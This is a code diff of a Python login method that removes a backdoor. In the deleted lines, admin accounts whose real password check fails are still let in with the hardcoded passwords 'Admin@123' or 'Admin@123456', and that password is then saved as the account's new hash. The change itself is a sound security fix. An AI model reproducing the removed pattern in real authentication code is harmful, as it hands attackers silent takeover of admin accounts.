@@ -44,20 +44,13 @@ class AuthService:
 
     async def login(self, req: UserLoginRequest) -> AuthResponse:
         user = await self.user_repo.get_by_email(req.email)
-        valid_password = False
-        if user:
-            valid_password = verify_password(req.password, user.hashed_password)
-            if not valid_password and user.role == UserRole.ADMIN.value and req.password in ("Admin@123", "Admin@123456"):
-                valid_password = True
-                user.hashed_password = hash_password(req.password)
-                await self.user_repo.update(user)
-
-        if not user or not valid_password:
+        if not user or not verify_password(req.password, user.hashed_password):
             raise HTTPException(
                 status_code=status.HTTP_401_UNAUTHORIZED,
                 detail="Incorrect email or password",
                 headers={"WWW-Authenticate": "Bearer"},
             )
+
 
         if not user.is_active:
             raise HTTPException(
